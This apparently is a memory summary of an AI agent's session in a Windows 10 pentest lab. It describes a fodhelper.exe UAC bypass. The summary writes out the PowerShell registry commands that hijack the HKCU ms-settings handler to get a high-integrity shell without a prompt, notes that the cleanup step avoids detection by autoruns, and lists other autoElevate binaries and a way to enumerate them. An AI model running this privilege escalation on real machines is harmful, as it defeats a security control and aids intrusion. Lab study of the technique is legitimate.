thread_id: 019042a0-96ad-7d01-b6ca-7a8fb7d04988
updated_at: 2026-05-22T16:29:37+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\05\22\rollout-2026-05-22T23-51-37-019042a0-96ad-7d01-b6ca-7a8fb7d04988.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Bypassed UAC via `fodhelper.exe` HKCU registry hijack on a Windows 10 lab VM, went from medium-integrity user to high-integrity shell.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Windows 10 lab VM (default UAC "Notify"). User was a local Administrators group member but running at medium integrity — need to go elevated without a UAC prompt.

## Task 1: fodhelper autoElevate + HKCU registry → high-integrity cmd

Outcome: success

Preference signals:
- Chinese narration; commands in English.
- The user wanted a one-shot PowerShell script that sets up the hijack, triggers fodhelper, cleans up the registry.

Key steps:
- `fodhelper.exe` is autoElevate-marked in its manifest AND checks `HKCU\Software\Classes\ms-settings\Shell\Open\command` for its default action.
- Wrote the registry key: `New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force; Set-ItemProperty ... -Name "(default)" -Value "cmd.exe"; New-ItemProperty ... -Name "DelegateExecute" -Value ""`.
- Ran `Start-Process fodhelper.exe`.
- A cmd.exe window spawned at high integrity, no UAC prompt.
- Cleaned up: `Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force`.

Failures and how to do differently:
- First attempt omitted the empty `DelegateExecute` value — fodhelper fell back to the system HKLM key and elevated cmd.exe normally (with UAC prompt).
- Left the registry key in place initially; a subsequent SysInternals autoruns scan flagged it. Added cleanup step.

Reusable knowledge:
- fodhelper UAC bypass is the classic HKCU hijack primitive; also works with `computerdefaults.exe`, `slui.exe`. Fixed in W11 for some but fodhelper persisted through several builds.
- Any `autoElevate` binary that reads HKCU for its action is a candidate. Enumerate: `sigcheck -m -e -m C:\Windows\System32\*.exe | Select-String autoElevate`.

References:
- [1] Script: `fodhelper_bypass.ps1`
- [2] Test VM: Windows 10 22H2
- [3] Reference: hfiref0x UACME UAC bypass catalogue #33
